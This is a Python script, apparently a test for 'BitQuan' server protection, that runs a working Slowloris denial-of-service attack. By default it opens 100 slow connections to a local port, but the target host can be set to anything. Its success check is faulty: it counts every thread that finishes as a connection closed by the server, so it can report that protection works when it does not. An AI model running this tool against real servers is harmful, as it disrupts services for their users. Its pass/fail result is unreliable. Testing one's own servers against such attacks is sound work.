#!/usr/bin/env python3
"""
Slowloris attack simulation for testing async network protection.

This script simulates a Slowloris attack by:
1. Opening many connections
2. Sending data very slowly (1 byte every 29 seconds)
3. Verifying the server closes connections after timeout

Expected result: Server should close all connections after 30s.
"""

import socket
import time
import argparse
import threading
import sys

def slow_connection(host, port, connection_id, send_interval=29, duration=60):
    """
    Create a single slow connection that sends data at specified intervals.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)  # Connection timeout
        s.connect((host, port))

        print(f"[+] Connection {connection_id}: Connected to {host}:{port}")

        # Send initial data to establish connection
        try:
            s.send(b'GET / HTTP/1.1\r\n')
            s.send(b'Host: ' + host.encode() + b'\r\n')
            s.send(b'User-Agent: Slowloris-Test\r\n')
        except Exception as e:
            print(f"[-] Connection {connection_id}: Failed to send initial data: {e}")
            return False

        # Send data slowly
        start_time = time.time()
        bytes_sent = 0

        while time.time() - start_time < duration:
            try:
                # Send a header byte very slowly
                s.send(b'X')
                bytes_sent += 1
                print(f"[*] Connection {connection_id}: Sent byte {bytes_sent}")

                # Wait for specified interval
                time.sleep(send_interval)

            except socket.error as e:
                print(f"[-] Connection {connection_id}: Connection closed by server: {e}")
                return True  # Connection properly closed by server
            except Exception as e:
                print(f"[-] Connection {connection_id}: Error: {e}")
                return False

        print(f"[-] Connection {connection_id}: Test completed, connection still open")
        return False

    except Exception as e:
        print(f"[-] Connection {connection_id}: Failed to connect: {e}")
        return False
    finally:
        try:
            s.close()
        except Exception:
            pass

def slowloris_attack(host, port, connections=100, send_interval=29, duration=60):
    """
    Simulate Slowloris attack with multiple slow connections.
    """
    print(f"Starting Slowloris simulation:")
    print(f"  Target: {host}:{port}")
    print(f"  Connections: {connections}")
    print(f"  Send interval: {send_interval}s")
    print(f"  Test duration: {duration}s")
    print()

    # Track connection status
    active_connections = []
    closed_by_server = 0
    failed_connections = 0

    # Create threads for each connection
    threads = []

    print(f"[*] Opening {connections} connections...")
    for i in range(connections):
        thread = threading.Thread(
            target=slow_connection,
            args=(host, port, i + 1, send_interval, duration),
            daemon=True
        )
        threads.append(thread)

        try:
            thread.start()
            active_connections.append(thread)
            time.sleep(0.01)  # Small delay between connections
        except Exception as e:
            print(f"[-] Failed to start connection {i + 1}: {e}")
            failed_connections += 1

    print(f"[+] Started {len(active_connections)} connections successfully")
    print(f"[*] Monitoring connections for {duration} seconds...")

    # Wait for all threads to complete
    for thread in active_connections:
        thread.join(timeout=duration + 10)

        # Check if thread is still alive (means connection is still open)
        if thread.is_alive():
            failed_connections += 1
        else:
            closed_by_server += 1

    print(f"\n[*] Test completed after {duration} seconds")
    print(f"  Connections closed by server: {closed_by_server}")
    print(f"  Connections still open: {failed_connections}")
    print(f"  Total connections attempted: {connections}")

    # Determine success
    success_rate = (closed_by_server / connections) * 100

    if success_rate >= 90:
        print(f"\n[+] SUCCESS! Server closed {success_rate:.1f}% of slow connections")
        print("    Slowloris protection is working correctly!")
        return True
    else:
        print(f"\n[!] FAILURE! Only {success_rate:.1f}% of connections were closed")
        print("    Slowloris protection may not be working properly!")
        return False

def check_server_responsive(host, port):
    """
    Check if the server is responsive to normal requests.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))

        # Send a simple HTTP request
        request = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n"
        s.send(request.encode())

        # Try to read response
        response = s.recv(1024)
        s.close()

        if response:
            print(f"[+] Server at {host}:{port} is responsive")
            return True
        else:
            print(f"[-] Server at {host}:{port} did not respond")
            return False

    except Exception as e:
        print(f"[-] Cannot connect to server at {host}:{port}: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Test Slowloris protection')
    parser.add_argument('--host', default='127.0.0.1', help='Target host (default: 127.0.0.1)')
    parser.add_argument('--port', type=int, default=18444, help='Target port (default: 18444)')
    parser.add_argument('--connections', type=int, default=100, help='Number of connections (default: 100)')
    parser.add_argument('--interval', type=int, default=29, help='Send interval in seconds (default: 29)')
    parser.add_argument('--duration', type=int, default=60, help='Test duration in seconds (default: 60)')
    parser.add_argument('--check-only', action='store_true', help='Only check if server is responsive')

    args = parser.parse_args()

    print("=" * 60)
    print("BitQuan Slowloris Attack Protection Test")
    print("=" * 60)

    # Check if server is responsive first
    if not check_server_responsive(args.host, args.port):
        if args.check_only:
            sys.exit(1)
        print("\n[*] Starting Slowloris test anyway...")
    else:
        print("[*] Server is responsive, proceeding with Slowloris test...")

    if args.check_only:
        print("[*] Server check completed")
        sys.exit(0)

    # Run the Slowloris simulation
    print()
    start_time = time.time()
    success = slowloris_attack(
        args.host,
        args.port,
        args.connections,
        args.interval,
        args.duration
    )
    end_time = time.time()

    print(f"\n[*] Total test time: {end_time - start_time:.1f} seconds")

    # Check server responsiveness after the attack
    print("\n[*] Checking server responsiveness after attack...")
    if check_server_responsive(args.host, args.port):
        print("[+] Server is still responsive after the attack!")
    else:
        print("[-] Server is not responsive after the attack - possible DoS")

    # Exit with appropriate code
    sys.exit(0 if success else 1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
        sys.exit(2)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(3)
